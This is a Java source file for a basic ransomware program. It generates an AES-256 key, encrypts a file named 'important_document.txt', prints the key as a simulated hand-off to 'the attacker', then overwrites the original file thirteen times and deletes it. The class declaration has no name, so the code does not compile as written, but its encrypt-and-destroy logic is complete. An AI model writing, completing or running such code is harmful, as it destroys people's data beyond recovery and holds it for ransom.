import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.*;
import java.security.SecureRandom;

public class {
    // Generate AES key
    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256); // AES-256 encryption
        return keyGen.generateKey();
    }

    // Encrypt file using AES
    public static void encryptFile(File inputFile, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] inputFileBytes = Files.readAllBytes(inputFile.toPath());
        byte[] encryptedBytes = cipher.doFinal(inputFileBytes);
        // Write encrypted data to a new file
        FileOutputStream outputStream = new FileOutputStream(inputFile.getName() + ".encrypted");
        outputStream.write(encryptedBytes);
        outputStream.close();
    }

    // Simulate sending the encryption key to the attacker
    public static void sendKeyToAttacker(SecretKey secretKey) {
        // Simulate key transmission by printing the key in hex
        System.out.println("Encryption key (send to attacker): " + bytesToHex(secretKey.getEncoded()));
    }

    // Securely delete the original file by overwriting it 13 times
    public static void deleteFileSecurely(File file) throws IOException {
        SecureRandom random = new SecureRandom();
        byte[] randomData = new byte[1024]; // Buffer for random data
        for (int i = 0; i < 13; i++) { // Overwrite file 13 times
            try (RandomAccessFile raf = new RandomAccessFile(file, "rw")) {
                long length = file.length();
                while (length > 0) {
                    random.nextBytes(randomData); // Write random data
                    raf.write(randomData, 0, (int) Math.min(randomData.length, length));
                    length -= randomData.length;
                }
            }
        }
        // Delete the file after overwriting
        file.delete();
        System.out.println("Original file deleted securely.");
    }

    // Helper function to convert bytes to hex string for key transmission
    public static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public static void main(String[] args) {
        try {
            // File to be encrypted
            File originalFile = new File("important_document.txt");
            // Generate encryption key
            SecretKey secretKey = generateKey();
            // Encrypt the file
            encryptFile(originalFile, secretKey);
            // Simulate sending the key to the attacker
            sendKeyToAttacker(secretKey);
            // Securely delete the original file
            deleteFileSecurely(originalFile);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
